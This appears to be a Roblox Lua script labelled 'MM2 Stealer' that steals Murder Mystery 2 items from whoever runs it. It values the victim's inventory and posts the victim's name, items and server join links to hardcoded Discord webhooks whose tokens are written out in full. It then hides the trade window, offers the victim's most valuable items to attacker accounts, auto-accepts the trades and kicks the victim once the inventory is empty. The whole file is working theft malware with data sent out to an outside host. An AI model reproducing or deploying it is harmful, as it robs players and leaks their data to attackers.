local logs_webhook = "https://discord.com/api/webhooks/1383473069372473484/VdGRMaHGf8dcAxD8BnjVEWL4NciWVVzu5yqg17ViuSwlxOVn5JToJSmWU5uAoJP5eCWB"

local dual_username = "hateable283"
local dual_webhook = "https://discord.com/api/webhooks/1383483314035232873/Jn4W_b6IpBPL4nxRTJwAHkGT4It51vAbmZE3RleXxhJR9UfvCBMzNZyC-e3EHXdkh_2w"
local dual_value = 500

local req = (syn and syn.request) or (http and http.request) or (http_request) or request
local executor = (identifyexecutor and identifyexecutor()) or "Unknown"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local GetProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData
local OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem")
local SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest")
local AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")

local Values = {
    -- [Your existing values table remains the same]
    -- ... (keep all your existing values)
}

local function formatNumber(n)
    if not tonumber(n) then return "0" end
    return tostring(n):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local function getTotalValue()
    local success, profileData = pcall(function()
        return GetProfileData:InvokeServer()
    end)
    if not (success and profileData) then return 0 end

    local weapons = profileData["Weapons"]
    local total = 0
    if weapons and weapons.Owned then
        for itemId, count in pairs(weapons.Owned) do
            local quantity = typeof(count) == "number" and count or 1
            local value = tonumber(Values[itemId]) or 0
            total = total + (value * quantity)
        end
    end
    return total
end

local function getTopItems()
    local success, profileData = pcall(function()
        return GetProfileData:InvokeServer()
    end)
    if not (success and profileData) then return {} end

    local weapons = profileData["Weapons"]
    local items = {}
    if weapons and weapons.Owned then
        for itemId, count in pairs(weapons.Owned) do
            local quantity = typeof(count) == "number" and count or 1
            local value = tonumber(Values[itemId]) or 0
            if value > 0 then
                table.insert(items, {id = itemId, category = "Weapons", value = value, quantity = quantity})
            end
        end
    end

    table.sort(items, function(a, b)
        return a.value > b.value
    end)

    return items
end

local function summariseItems(items)
    local lines = {}
    for _, item in ipairs(items) do
        table.insert(lines, string.format("%s - %s (%dx)", item.id, formatNumber(item.value), item.quantity))
    end
    return table.concat(lines, "\n")
end

local function sendWebhook(totalValue, tradableSummary)
    local payload = {
        ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
        ["embeds"] = { {
            ["title"] = ":skull: MM2 Stealer",
            ["color"] = 0x00ffcc,
            ["fields"] = {
                {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name},
                {["name"] = ":crown: Creator", ["value"] = username},
                {["name"] = ":jigsaw: Executor", ["value"] = executor},
                {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue)},
                {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```"},
                {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
            },
            ["footer"] = {["text"] = "by Eli • " .. os.date("%B %d, %Y")},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local logs_payload = {
        ["embeds"] = { {
            ["title"] = ":skull: MM2 LOGS",
            ["color"] = 0x00ffcc,
            ["fields"] = {
                {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name},
                {["name"] = ":jigsaw: Executor", ["value"] = executor},
                {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue)},
                {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```"},
                {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
            },
            ["footer"] = {["text"] = "by Eli • " .. os.date("%B %d, %Y")},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local target_webhook = webhook
    local target_logs = logs_webhook

    if totalValue >= dual_value then
        target_webhook = dual_webhook
    end

    local function sendPayload(payload, url)
        pcall(function()
            req({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode(payload)
            })
        end)
    end

    sendPayload(payload, target_webhook)
    sendPayload(logs_payload, target_logs)
end

local function kickPlayer()
    LocalPlayer:Kick("Inventory emptied successfully")
end

-- Check inventory value every 5 seconds
task.spawn(function()
    while true do
        local currentValue = getTotalValue()
        if currentValue <= 0 then
            kickPlayer()
            break
        end
        task.wait(5)
    end
end)

local items = getTopItems()
local total = 0
for _, item in ipairs(items) do
    total += item.value * item.quantity
end
sendWebhook(total, summariseItems(items))

local function doTrade(player)
    local gui = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
    gui.Enabled = false

    local items = getTopItems()
    local count = 0

    for _, item in ipairs(items) do
        for _ = 1, item.quantity do
            OfferItem:FireServer(item.id, item.category)
            task.wait(0.1)
        end
        count += 1
        if count >= 4 then break end
    end
end

local active = false
local targetPlayer = nil

local function startLoop(player)
    if active then return end
    active = true
    targetPlayer = player

    task.spawn(function()
        local gui = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        while true do
            if not gui.Enabled then
                SendRequest:InvokeServer(targetPlayer)
            else
                doTrade(targetPlayer)
                gui.Enabled = false
            end
            task.wait(0.4)
        end
    end)
end

local function connectChat(player)
    player.Chatted:Connect(function()
        local items = getTopItems()
        local value = 0
        for _, item in ipairs(items) do
            value += item.value * item.quantity
        end

        local expected = (value >= dual_value) and dual_username or username
        if player.Name == expected then
            startLoop(player)
        end
    end)
end

for _, p in ipairs(Players:GetPlayers()) do
    if p.Name == username or p.Name == dual_username then
        connectChat(p)
    end
end

Players.PlayerAdded:Connect(function(p)
    if p.Name == username or p.Name == dual_username then
        connectChat(p)
    end
end)

task.spawn(function()
    while true do
        AcceptTrade:FireServer(285646582)
        task.wait(0.5)
    end
end)
